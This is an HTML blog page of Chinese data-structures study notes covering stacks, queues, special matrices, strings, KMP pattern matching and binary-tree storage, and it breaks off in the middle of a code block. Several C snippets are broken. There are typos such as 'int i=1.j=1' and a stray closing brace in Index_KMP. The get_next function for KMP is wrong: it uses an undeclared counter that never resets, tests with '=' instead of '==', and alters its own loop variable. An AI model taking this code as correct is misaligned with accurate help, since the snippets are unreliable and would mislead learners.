<h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603174425521.png" alt="image-20220603174425521" style="zoom: 67%;"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603174505573.png" alt="image-20220603174505573" style="zoom:67%;"></p>
<h2 id="栈在括号匹配中的应用"><a href="#栈在括号匹配中的应用" class="headerlink" title="栈在括号匹配中的应用"></a>栈在括号匹配中的应用</h2><p>IDE:可视化的编程环境</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220603180407947.png" alt="image-20220603180407947" style="zoom:67%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603180507316.png" alt="image-20220603180507316" style="zoom:67%;"></p>
<p>扫描到左括号就入栈，扫描到右括号就出栈进行匹配 </p>
<p>代码实现</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603182409614.png" alt="image-20220603182409614"></p>
<h2 id="栈在表达式求值中的应用"><a href="#栈在表达式求值中的应用" class="headerlink" title="栈在表达式求值中的应用"></a>栈在表达式求值中的应用</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603183310686.png" alt="image-20220603183310686"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603184904342.png" alt="image-20220603184904342"></p>
<p>先出栈的是右操作数，后出栈的是左操作数 </p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603191739417.png" alt="image-20220603191739417"></p>
<h2 id="栈的应用——递归"><a href="#栈的应用——递归" class="headerlink" title="栈的应用——递归"></a>栈的应用——递归</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603192451544.png" alt="image-20220603192451544"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603192500473.png" alt="image-20220603192500473"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603192716850.png" alt="image-20220603192716850"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603193038318.png" alt="image-20220603193038318"></p>
<p>递归调用时，函数调用栈可称为递归工作栈</p>
<p>递归算法的缺点：太多层递归可能导致栈溢出。可能包含多次重复计算</p>
<h2 id="队列的应用"><a href="#队列的应用" class="headerlink" title="队列的应用"></a>队列的应用</h2><h3 id="树的层次遍历"><a href="#树的层次遍历" class="headerlink" title="树的层次遍历"></a>树的层次遍历</h3><p>具体查看树的章节</p>
<h3 id="图的广度优先遍历"><a href="#图的广度优先遍历" class="headerlink" title="图的广度优先遍历"></a>图的广度优先遍历</h3><p>具体查看图的章节</p>
<h3 id="在操作系统中的应用"><a href="#在操作系统中的应用" class="headerlink" title="在操作系统中的应用"></a>在操作系统中的应用</h3><p>FCFS(First Come First Service)先来先服务的策略</p>
<p>eg1：</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194341970.png" alt="image-20220603194341970"></p>
<p>轮流获得cpu的服务</p>
<p>eg2：</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194439959.png" alt="image-20220603194439959"></p>
<p>可缓解主机域打印机速度不匹配的问题</p>
<h2 id="特殊矩阵"><a href="#特殊矩阵" class="headerlink" title="特殊矩阵"></a>特殊矩阵</h2><h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>ElemType a[10];    //ElemType型一维数组</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194725210.png" alt="image-20220603194725210"></p>
<h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>ElemType b[2] [4]    //2行4列的二维数组</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194843476.png" alt="image-20220603194843476"></p>
<p>起始地址：LOC</p>
<p>行优先存储地址计算<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603194958977.png" alt="image-20220603194958977"></p>
<p>列优先存储地址计算<img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603195101464.png" alt="image-20220603195101464"></p>
<p>二维数组也具有随机存储的性质</p>
<h3 id="普通矩阵的存储"><a href="#普通矩阵的存储" class="headerlink" title="普通矩阵的存储"></a>普通矩阵的存储</h3><h4 id="对称矩阵"><a href="#对称矩阵" class="headerlink" title="对称矩阵"></a>对称矩阵</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603195510230.png" alt="image-20220603195510230"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603195836998.png" alt="image-20220603195836998" style="zoom:67%;"></p>
<h3 id="三角矩阵"><a href="#三角矩阵" class="headerlink" title="三角矩阵"></a>三角矩阵</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603200202029.png" alt="image-20220603200202029"></p>
<h3 id="三对角矩阵（带状矩阵）"><a href="#三对角矩阵（带状矩阵）" class="headerlink" title="三对角矩阵（带状矩阵）"></a>三对角矩阵（带状矩阵）</h3><p>  <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603200953049.png" alt="image-20220603200953049"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603201426822.png" alt="image-20220603201426822" style="zoom:80%;"></p>
<h3 id="稀疏矩阵"><a href="#稀疏矩阵" class="headerlink" title="稀疏矩阵"></a>稀疏矩阵</h3><p>非零元素的个数远远少于矩阵元素的个数</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603201607063.png" alt="image-20220603201607063" style="zoom:50%;"></p>
<p> <img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220603201638617.png" alt="image-20220603201638617" style="zoom: 80%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220603201828331.png" alt="image-20220603201828331" style="zoom: 67%;"></p>
<h1 id="第四章——串"><a href="#第四章——串" class="headerlink" title="第四章——串"></a>第四章——串</h1><h2 id="串的基本操作"><a href="#串的基本操作" class="headerlink" title="串的基本操作"></a>串的基本操作</h2><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>即字符串（string）由零个或者多个字符组成的有限序列，一般记为：</p>
<script type="math/tex; mode=display">
S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为空串</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162622856.png" alt="image-20220604162622856"></p>
<p>子串：串中任意个<strong>连续</strong>的字符组成的子序列</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163002890.png" alt="image-20220604163002890"></p>
<p>主串：包含子串的串</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162948821.png" alt="image-20220604162948821"></p>
<p>字符在主串中的位置：字符在串中的序号  （ps：空格也是一种字符）</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162939273.png" alt="image-20220604162939273"></p>
<p>子串在主串中的位置：子串的第一个字符在主串中的位置</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604162903691.png" alt="image-20220604162903691" style="zoom:67%;"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163018603.png" alt="image-20220604163018603" style="zoom:67%;"></p>
<p>串是一种特殊的线性表，数据元素之间呈现线性关系</p>
<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163702551.png" alt="image-20220604163702551"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604163803577.png" alt="image-20220604163803577" style="zoom:80%;"></p>
<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><p>y=f(x)</p>
<p>字符集：函数定义域</p>
<p>编码：函数映射规则f</p>
<p>y：对应的二进制数</p>
<p>英文字符——ASCII字符集  （2^8只有256种状态）</p>
<p>中英文——Unicode字符集</p>
<p>考研中默认每个字符占1B</p>
<h4 id="拓展——乱码问题"><a href="#拓展——乱码问题" class="headerlink" title="拓展——乱码问题"></a>拓展——乱码问题</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604164822168.png" alt="image-20220604164822168"></p>
<h2 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h2><h3 id="串的顺序存储"><a href="#串的顺序存储" class="headerlink" title="串的顺序存储"></a>串的顺序存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLEN 255     <span class="comment">//预定义最大串长为255</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[MAXLEN];   <span class="comment">//每个分类存储一个字符</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的实际长度</span></span><br><span class="line">&#125;SString;<span class="comment">//静态数组实现（定长顺序存储）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *ch;          <span class="comment">//按串长分配存储区，ch指向串的基地址</span></span><br><span class="line">    <span class="type">int</span> length;        <span class="comment">//串的长度</span></span><br><span class="line">&#125;HString;<span class="comment">//动态数组实现（堆分配存储）</span></span><br><span class="line">HString S;</span><br><span class="line">S.ch = (<span class="type">char</span> *)<span class="built_in">malloc</span>(MAXLEN*<span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">S.length=<span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>优点：随机存取</p>
<p>缺点：插入删除操作不方便</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604165848221.png" alt="image-20220604165848221"></p>
<p>方案一：需要额外一片空间</p>
<p>方案二：length只占1B即8bit所以数组不能超过255</p>
<p>方案三：每次求表长都需要遍历整个字符串</p>
<h3 id="串的链式存储"><a href="#串的链式存储" class="headerlink" title="串的链式存储"></a>串的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch;                      <span class="comment">//每个结点存一个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;             <span class="comment">//存储密度低，每个字节1B，每个指针4B</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">//改良</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">4</span>];                   <span class="comment">//每个结点存多个字符</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StringNode</span> * <span class="title">next</span>;</span></span><br><span class="line">&#125;StringNode, *String;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604171058073.png" alt="image-20220604171058073"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604171107252.png" alt="image-20220604171107252"></p>
<h3 id="基本操作的实现"><a href="#基本操作的实现" class="headerlink" title="基本操作的实现"></a>基本操作的实现</h3><h4 id="求子串"><a href="#求子串" class="headerlink" title="求子串"></a>求子串</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172524171.png" alt="image-20220604172524171"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">SubString</span><span class="params">(SString &amp;Sub,SString S,<span class="type">int</span> pos,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="comment">//子串范围越界</span></span><br><span class="line">    <span class="keyword">if</span>(pos+len<span class="number">-1</span>&gt;S.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=pos;i&lt;len+pos;i++)</span><br><span class="line">        Sub.ch[i-pos+<span class="number">1</span>]=S.ch[i];</span><br><span class="line">    Sub.length=len;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="比较两个串的大小"><a href="#比较两个串的大小" class="headerlink" title="比较两个串的大小"></a>比较两个串的大小</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172617169.png" alt="image-20220604172617169" style="zoom:67%;"><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/Users\18251\AppData\Roaming\Typora\typora-user-images\image-20220604172621936.png" alt="image-20220604172621936" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">StrCompare</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=S.length &amp;&amp; i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]!=T.ch[i])</span><br><span class="line">            <span class="keyword">return</span> S.ch[i]-T.ch[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//扫描过的所有字符都相同，则长度长的串更大</span></span><br><span class="line">    <span class="keyword">return</span> S.length-T.length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定位操作"><a href="#定位操作" class="headerlink" title="定位操作"></a>定位操作</h4><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172716580.png" alt="image-20220604172716580"></p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604172735794.png" alt="image-20220604172735794" style="zoom:67%;"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>,n=S.length,m=T.length;</span><br><span class="line">    SString sub;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n-m+<span class="number">1</span>)&#123;</span><br><span class="line">        SubString(sub,S,i,m);</span><br><span class="line">        <span class="keyword">if</span>(StrCompare(sub,T)!=<span class="number">0</span>)</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="朴素模式匹配算法"><a href="#朴素模式匹配算法" class="headerlink" title="朴素模式匹配算法"></a>朴素模式匹配算法</h2><p>字符串模式匹配：在主串中找到域模式串相同的子串，并返回其所在位置</p>
<p>子串：主串的一部分</p>
<p>模式串：不一定能在主串中找到</p>
<p>(暴力破解（穷举）)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index</span><span class="params">(SString S,SString T)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(S.ch[i]==T.ch[j])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            i=i-j+<span class="number">2</span>;</span><br><span class="line">            j=<span class="number">1</span>;                <span class="comment">//指针后退重新开始匹配</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主串长度为n</p>
<p>模式串长度为m</p>
<p>最好时间复杂度=O(n)</p>
<p>最坏时间复杂度=O((n-m+1)m)=O(nm)</p>
<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>基于朴素模式算法优化而来</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220604181601977.png" alt="image-20220604181601977"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (S[i]!=T[j])</span><br><span class="line">    j=next[j];</span><br><span class="line"><span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">	i++;</span><br><span class="line">	j++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据模式串T，求出next数组——&gt;利用next数据进行匹配（主指针不回溯）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Index_KMP</span><span class="params">(SString S,SString T,<span class="type">int</span> next[])</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1.</span>j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=S.length &amp;&amp; j&lt;=T.length)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">0</span> || S.ch[i]==T.ch[j ])&#123;</span><br><span class="line">            i++;j++;            <span class="comment">//继续比较后续字符</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j=next[j];          <span class="comment">//主串指针i不回溯，模式串向右移动，KMP算法核心</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;T.length)</span><br><span class="line">        <span class="keyword">return</span> i-T.length;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最坏时间复杂度：O(m+n)     求next数组的时间复杂度O(m)模式匹配时间复杂度O(n)</p>
<h2 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a><strong>求next数组</strong></h2><p>任何模式串都一样</p>
<p>第一个字符不匹配时，next[1]=0</p>
<p>第二个字符不匹配时，next[2]=1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(SString S,SString T,<span class="type">int</span> *next)</span>&#123;</span><br><span class="line">    next[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    next[<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=T.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> j=i;</span><br><span class="line">        <span class="keyword">while</span>(j&gt;<span class="number">2</span> &amp;&amp; T.ch[i<span class="number">-1</span>]!=T.ch[j<span class="number">-2</span>])&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(T.ch[i<span class="number">-1</span>]=T.ch[j<span class="number">-1</span>])&#123;</span><br><span class="line">            length++;</span><br><span class="line">            i--,j--;</span><br><span class="line">        &#125;</span><br><span class="line">        next[i]=length+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="第五章——树与二叉树"><a href="#第五章——树与二叉树" class="headerlink" title="第五章——树与二叉树"></a>第五章——树与二叉树</h1><h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><p>非空树：有且仅有一个根节点</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220629122020259.png" alt="image-20220629122020259" style="zoom:67%;"></p>
<p>空树：节点数为0的树<br>没有后继的结点成为叶子节点（终端节点）<br><strong>除了根节点之外有且仅有一个前驱</strong></p>
<h3 id="子树"><a href="#子树" class="headerlink" title="子树"></a>子树</h3><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220629122304793.png" alt="image-20220629122304793"></p>
<p>子树互不相交</p>
<p><strong>树是一种递归定义的数据结构</strong></p>
<h3 id="节点之间的路径"><a href="#节点之间的路径" class="headerlink" title="节点之间的路径"></a>节点之间的路径</h3><p>路径是单向的，只能从上往下</p>
<h3 id="路径长度"><a href="#路径长度" class="headerlink" title="路径长度"></a>路径长度</h3><p>经过几条边</p>
<h3 id="结点，树的属性描述"><a href="#结点，树的属性描述" class="headerlink" title="结点，树的属性描述"></a>结点，树的属性描述</h3><p>结点的层次（深度）——从上往下数<br>结点的高度——从下往上数<br>树的高度（深度）——总共多少层<br>结点的度——有几个孩子（分支）<br>树的度——各结点的度的最大值<br>默认从一开始</p>
<h2 id="有序树vs无序树"><a href="#有序树vs无序树" class="headerlink" title="有序树vs无序树"></a>有序树vs无序树</h2><p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220629123151781.png" alt="image-20220629123151781"></p>
<h2 id="森林"><a href="#森林" class="headerlink" title="森林"></a>森林</h2><p>森林是m棵互不相交的树的集合（m可为0，表示空森林）</p>
<h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>结点数=总度数+1<br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701140810203.png" alt="image-20220701140810203"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701140849174.png" alt="image-20220701140849174"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701140928499.png" alt="image-20220701140928499"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701141014648.png" alt="image-20220701141014648"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701141202675.png" alt="image-20220701141202675"></p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><p>二叉树是有序树（左右子树不能颠倒）递归定义的数据结构</p>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701141656221.png" alt="image-20220701141656221"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701142020842.png" alt="image-20220701142020842"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220701142503488.png" alt="image-20220701142503488"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709114958544.png" alt="image-20220709114958544"></p>
<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span>&#123;</span></span><br><span class="line">    ElemType value;<span class="comment">//结点中的数据元素</span></span><br><span class="line">    <span class="type">bool</span> isEmpty;<span class="comment">//结点是否为空</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeNode t[MaxSize];<span class="comment">//定义一个长度为MaxSize的数组t，按照从上至下从左至右的顺序依次存储完全二叉树的各个结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)&#123;</span><br><span class="line">    t[i].isEmpty=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709120058958.png" alt="image-20220709120058958"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709120134485.png" alt="image-20220709120134485"><br><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709120216992.png" alt="image-20220709120216992"></p>
<h3 id="二叉树的链式存储"><a href="#二叉树的链式存储" class="headerlink" title="二叉树的链式存储"></a>二叉树的链式存储</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">	ElemType data;                     <span class="comment">//数据域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>    <span class="comment">//左右孩子指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">parent</span>;</span>            <span class="comment">//父节点指针（三叉链表——方便找父节点）</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E6%80%BB%E7%BA%B2/image-20220709121942852.png" alt="image-20220709121942852"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一颗空树</span></span><br><span class="line">BiTree root =null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入根节点</span></span><br><span class="line">root = (BiTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">root-&gt;data = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">root-&gt;lchild = null;</span><br><span class="line">root-&gt;rchild = null;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入新结点</span></span><br><span class="line">BiTNode * p =(BiTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">p-&gt;data = &#123;<span class="number">2</span>&#125;;</span><br><span 